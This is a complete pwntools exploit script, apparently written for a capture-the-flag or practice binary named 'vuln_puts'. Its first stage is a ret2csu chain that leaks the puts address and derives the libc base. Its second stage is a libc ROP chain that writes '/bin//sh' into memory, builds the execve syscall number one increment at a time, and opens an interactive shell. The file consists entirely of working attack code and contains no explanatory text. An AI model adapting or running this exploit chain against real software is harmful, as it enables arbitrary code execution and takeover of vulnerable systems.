from pwn import *

p = process("./vuln_puts", env={"LD_PRELOAD": "./libc.so.6"})
#gdb.attach(p, "break *main")

# generated with leakyleak
payload_1 = ''
payload_1 += p64(0x4005ea) # gadget 1
payload_1 += p64(0) # rbx
payload_1 += p64(1) # rbp
payload_1 += p64(0x601018) # r12 [puts@got]
payload_1 += p64(0) # r13
payload_1 += p64(0) # r14
payload_1 += p64(0x601018) # r15 [puts@got]
payload_1 += p64(0x4005d0) # gadget 2
payload_1 += p64(0) # junk to reach the next gadget
payload_1 += p64(0) # junk
payload_1 += p64(0) # junk
payload_1 += p64(0) # junk
payload_1 += p64(0) # junk
payload_1 += p64(0) # junk
payload_1 += p64(0) # junk

payload_1 += p64(0x400566) # main

print p.recvline(False)
print "[+] sending payload 1"
p.sendline("a"*24 + payload_1)

leak = u64(p.recvline(False).ljust(8, "\x00")[:8])
print "[+] puts address leak: 0x%x" % leak

print "[+] restarting main with last gadget"
print p.recvline(False)

libc_addr = leak - (0x7f14f0bbd690 - 0x7f14f0b4e000)
print "[+] libc base address: 0x%x" % libc_addr

# generated with ROPGadget
payload_2 = ""
payload_2 += p64(libc_addr + 0x0000000000001b92) # pop rdx ; ret
payload_2 += p64(libc_addr + 0x00000000003c4080) # @ .data
payload_2 += p64(libc_addr + 0x0000000000033544) # pop rax ; ret
payload_2 += '/bin//sh'
payload_2 += p64(libc_addr + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
payload_2 += p64(libc_addr + 0x0000000000001b92) # pop rdx ; ret
payload_2 += p64(libc_addr + 0x00000000003c4088) # @ .data + 8
payload_2 += p64(libc_addr + 0x000000000008b8c5) # xor rax, rax ; ret
payload_2 += p64(libc_addr + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
payload_2 += p64(libc_addr + 0x0000000000021102) # pop rdi ; ret
payload_2 += p64(libc_addr + 0x00000000003c4080) # @ .data
payload_2 += p64(libc_addr + 0x00000000000202e8) # pop rsi ; ret
payload_2 += p64(libc_addr + 0x00000000003c4088) # @ .data + 8
payload_2 += p64(libc_addr + 0x0000000000001b92) # pop rdx ; ret
payload_2 += p64(libc_addr + 0x00000000003c4088) # @ .data + 8
payload_2 += p64(libc_addr + 0x000000000008b8c5) # xor rax, rax ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000abf40) # add rax, 1 ; ret
payload_2 += p64(libc_addr + 0x00000000000bc375) # syscall ; ret

print "[+] sending payload 2"
p.sendline("a"*24 + payload_2)

p.interactive()

